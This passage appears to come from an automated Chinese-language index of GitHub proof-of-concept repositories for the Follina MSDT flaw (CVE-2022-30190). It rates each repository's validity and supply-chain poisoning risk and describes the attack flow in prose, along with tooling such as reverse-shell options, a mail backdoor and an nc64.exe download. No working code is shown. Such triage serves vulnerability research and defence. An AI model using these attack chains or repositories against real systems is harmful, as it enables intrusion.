**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
